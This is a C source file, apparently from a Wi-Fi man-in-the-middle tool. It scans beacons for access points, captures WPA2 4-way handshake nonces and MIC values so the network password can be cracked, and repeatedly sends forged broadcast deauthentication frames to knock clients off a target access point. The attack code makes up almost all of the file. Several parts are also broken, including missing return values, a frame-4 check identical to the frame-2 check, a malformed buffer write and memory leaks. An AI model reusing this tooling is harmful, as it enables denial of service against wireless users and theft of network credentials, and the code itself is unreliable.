#include "ieee80211_data.h"
#include "l2_packet.h"
#include "../../MITM.h"
static int parse_llc_header(const char* buf, size_t len, 
		uint32_t *offset, struct WPA2_handshake_packet *packet) {
	if (*offset > len) return -1;

	packet->llc_hdr = *(struct llc_header*)(buf + *offset);
	packet->llc_hdr.type = ntohs(packet->llc_hdr.type);
	*offset += sizeof(struct llc_header);
	return 0;
}

static int parse_auth_data(const char *buf, size_t len,
		uint32_t *offset, struct WPA2_handshake_packet *packet) {
	
	packet->auth_data = *(struct ieee_8021x_authentication*) (buf + *offset);
	*offset += sizeof(struct ieee_8021x_authentication);
	if (*offset - 8 > len) return -1; 
	/* The 1 and 4 of handshake have not key payload,
	 * so the size of handshake structure will big than length of packet.*/

	packet->auth_data.data = (buf + *offset);
	packet->auth_data.len = ntohs(packet->auth_data.len);
	print_handshake_packet(packet);
	return 0;
}

static int fill_encry_info(struct encrypto_info * info, const struct WPA2_handshake_packet *packet) {
	/* XXX : How to make sure the handshake packet is the same process ? */
	/* frame 2 of 4-way handshake */
	if ((packet->auth_data.key_information & WPA_KEY_INFO_MIC) &&
	    !(packet->auth_data.key_information & WPA_KEY_INFO_ACK) &&
	    !(packet->auth_data.key_information & WPA_KEY_INFO_INSTALL)) {
		memcpy(info->SN, packet->auth_data.Nonce, NONCE_ALEN);	
		memcpy(info->SA, LOCATE(u8, packet->ieee80211_data, 
					struct ieee80211_hdr_3addr, addr2), ETH_ALEN);
	}
	/* frame 3 of 4-way handshake */
	if ((packet->auth_data.key_information & WPA_KEY_INFO_MIC) &&
	    (packet->auth_data.key_information & WPA_KEY_INFO_ACK) &&
	    (packet->auth_data.key_information & WPA_KEY_INFO_INSTALL) &&
	    !memcmp(info->SA, LOCATE(u8, packet->ieee80211_data, 
			    struct ieee80211_hdr_3addr, addr1), ETH_ALEN)) {
		memcpy(info->AN, packet->auth_data.Nonce, NONCE_ALEN);
	}

	/* frame 4 of 4-way handshake */
	if ((packet->auth_data.key_information & WPA_KEY_INFO_MIC) &&
			!(packet->auth_data.key_information & WPA_KEY_INFO_ACK) &&
			!(packet->auth_data.key_information & WPA_KEY_INFO_INSTALL)) {
		memcpy(info->MIC, packet->auth_data.MIC, MD5_DIGEST_LENGTH);
		
	}


}

void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *buf, size_t len) {
	
	struct MITM *MITM = (struct MITM *)ctx; 
	uint32_t offset;
	uint16_t type;
	void *packet = NULL;
	char* mac_s;
	mac_s = malloc(20);

	offset = ((struct ieee80211_radiotap_header *)buf)->it_len;

	if (offset > len) return;
	uint16_t tmp123 = *(uint16_t *)(buf + offset);
	if (tmp123 == 0x188 || tmp123 == 0x288)
		log_printf(MSG_DEBUG, "subtype = 0x%x", tmp123);
	type = parse_subtype(ntohs(*(uint16_t *)(buf + offset)));
//		log_printf(MSG_DEBUG, "type = 0x%x", type);
	switch (type) {
		case IEEE80211_BEACON :;
			/* XXX : Do we only maintance ap list in ap search state ?
			 * or we should do this always?*/
			//if (MITM->state != MITM_state_ap_search)
			//	break;
			struct ieee80211_hdr_3addr frame;
			int match = 0;
			frame = *(struct ieee80211_hdr_3addr *)(buf + offset);
			offset += sizeof(struct ieee80211_hdr_3addr);

			struct beacon_fix_params fix_param;
			fix_param = *((struct beacon_fix_params *)(buf + offset));
			offset += sizeof(struct beacon_fix_params);

			struct access_point_info *ap_info;
			ap_info = malloc(sizeof(struct access_point_info));
			memset(ap_info, 0, sizeof(struct access_point_info));
			copy_mac_address(frame.addr2, ap_info->BSSID);
			for (;offset + 2 < len ;) {
				enum beacon_param tag_name = *(buf + (offset++));
				uint8_t tag_len = *(buf + (offset++));
				switch(tag_name) {
				case BEACON_SSID :
					ap_info->SSID = strndup(buf + offset, tag_len);
					break;
				case BEACON_COUNTRY_INFO :
					strncpy(ap_info->country, buf+offset, COUNTRY_CODE_LEN);
					break;
				case BEACON_DS :
					ap_info->channel = *(buf + offset);
				}
				offset += tag_len;
			}
			if (!ap_info->SSID || !ap_info->channel) {
				free(ap_info);
				break;
			}
			struct access_point_info *tmp;
			dl_list_for_each(tmp, &MITM->ap_list, struct access_point_info, ap_node) {
				if (!memcmp(tmp->BSSID, ap_info->BSSID, ETH_ALEN)) {
					memcpy(tmp->country, ap_info->country, COUNTRY_CODE_LEN);
		//			strcpy(tmp->SSID, ap_info->SSID);
					tmp->channel = ap_info->channel;
					free(ap_info);
					match = 1;
					break;
				}
			}
			if (!match) {
				dl_list_add_tail(&MITM->ap_list, &ap_info->ap_node);
			}
		break;

		case IEEE80211_DATA : {
			/* we case the packet context util crash password. */
			if (MITM->state < 2) 
				break; 
			packet = malloc(sizeof(struct WPA2_handshake_packet));
			struct WPA2_handshake_packet *tmp = (struct WPA2_handshake_packet *)packet;
			tmp->type = type;	
			tmp->ieee80211_data = (struct ieee80211_hdr_3addr *)(buf + offset);
			/* Ignore packet which not came from target access point. */
			if (memcmp(LOCATE(u8 ,tmp->ieee80211_data, struct ieee80211_hdr_3addr, addr1)
						, MITM->encry_info.AA, ETH_ALEN) &&
			    memcmp(LOCATE(u8, tmp->ieee80211_data, struct ieee80211_hdr_3addr, addr2)
				    , MITM->encry_info.AA, ETH_ALEN)) break;
			offset += sizeof(struct ieee80211_hdr_3addr);

			parse_llc_header(buf, len, &offset, packet);

			if (tmp->llc_hdr.type == 0x888e && 
			   (MITM->state == MITM_state_capture_handshake)) {
				parse_auth_data(buf, len, &offset, packet);
				fill_encry_info(&MITM->encry_info, packet);
			}

		break;}
		
		case IEEE80211_QOS_DATA :{
			/* we case the packet context util crash password. */
			if (MITM->state < 2)
				break;
			packet = malloc(sizeof(struct WPA2_handshake_packet));
			struct WPA2_handshake_packet *tmp = (struct WPA2_handshake_packet *)packet;
			tmp->type = type;
			tmp->ieee80211_data = (struct ieee80211_qos_hdr *)(buf + offset);
			offset += sizeof(struct ieee80211_qos_hdr);
			
			parse_llc_header(buf, len , &offset, packet);
			if (tmp->llc_hdr.type == 0x888e &&
			   (MITM->state == MITM_state_capture_handshake))
				parse_auth_data(buf, len, &offset, packet);
		break;}
		case IEEE80211_DEAUTHENTICATION :
		break; 

		default:
			return;
	}
	free(mac_s);
	free(packet);
	return;
}

int prepare_deauth_pkt(u8 *buffer, size_t *pkt_len, u8 *victim, u8 *ap, u16 seq_num) {
	int is_broadcast = 0;
	if (!buffer || !ap) {
		log_printf(MSG_WARNING, "[%s]buffer or ap not exist");
		return -1;
	}
	if (!victim) 
		is_broadcast = 1;
	struct ieee80211_radiotap_header radiotap_hdr;
	memset(&radiotap_hdr, 0, sizeof(struct ieee80211_radiotap_header));
	radiotap_hdr.it_version = 0;
	radiotap_hdr.it_pad = 0;
	radiotap_hdr.it_len = 26;
	radiotap_hdr.it_present = htonl(IEEE80211_RADIOTAP_RATE);
//	radiotap_hdr.padload = 0x02;
	radiotap_hdr.padload = malloc(sizeof(uint8_t) * 18);
	*radiotap_hdr.padload++ = 0x7b;
	*radiotap_hdr.padload++ = 0x35;
	*radiotap_hdr.padload++ = 0x4f;
	*radiotap_hdr.padload++ = 0x21;
	*radiotap_hdr.padload++ = 0x00;
	*radiotap_hdr.padload++ = 0x00;
	*radiotap_hdr.padload++ = 0x00;
	*radiotap_hdr.padload++ = 0x00;
	*radiotap_hdr.padload++ = 0x40;
	*radiotap_hdr.padload++ = 0x30;
	*radiotap_hdr.padload++ = 0xad;
	*radiotap_hdr.padload++ = 0x16;
	*radiotap_hdr.padload++ = 0x40;
	*radiotap_hdr.padload++ = 0x01;
	*radiotap_hdr.padload++ = 0xac;
	*radiotap_hdr.padload++ = 0x00;
	*radiotap_hdr.padload++ = 0x00;
	*radiotap_hdr.padload = 0x00;

	struct ieee80211_hdr_3addr deauth;
	memset(&deauth, 0, sizeof(struct ieee80211_hdr_3addr));
	deauth.frame_control = htons(0xc111);
	if (is_broadcast) 
		memset(deauth.addr2, 0xff, ETH_ALEN);
	else 
		memcpy(deauth.addr2, victim, ETH_ALEN);
	memcpy(deauth.addr1, ap, ETH_ALEN);
	memcpy(deauth.addr3, ap, ETH_ALEN);
	deauth.seq_ctrl = htons(seq_num);

	*pkt_len = radiotap_hdr.it_len + sizeof(deauth);
	memcpy(buffer, &radiotap_hdr, radiotap_hdr.it_len);
	memcpy(buffer + radiotap_hdr.it_len, &deauth, sizeof(deauth));
	buffer[*pkt_len++] = htons(deauth_unspec_reason);
}

void deauth_attack(void *eloop_data, void *user_ctx) {
	struct MITM *MITM = (struct MITM *) user_ctx;
	u8 *packet;
	size_t pkt_len;
	int ret;
	packet = malloc(MTU);
	if (!packet)
		return;
	/* XXX : I am not really sure how to define the seqence num of packet */
	ret = prepare_deauth_pkt(packet, &pkt_len, NULL, MITM->encry_info.AA, 9500);
	if (ret < 0) {
		log_printf(MSG_WARNING, "[Deauth]Prepare deauthentication packet failed.");
	}
	ret = l2_packet_send(MITM->l2_packet, MITM->encry_info.AA, ETH_P_802_2, packet, pkt_len);
	if (ret < 0) {
		log_printf(MSG_WARNING, "[Deauth]Send deauth packet failed, with error:%s", strerror(errno));
	}
	if (!MITM->encry_info.enough) 
		eloop_register_timeout(1, 0, deauth_attack, NULL, MITM);
	free(packet);
}

void ap_init(struct access_point_info *info) {
	info->SSID = NULL;
	info->channel = 0;
	memset(info->country, 0, COUNTRY_CODE_LEN);
	memset(info->BSSID, 0, ETH_ALEN);
}
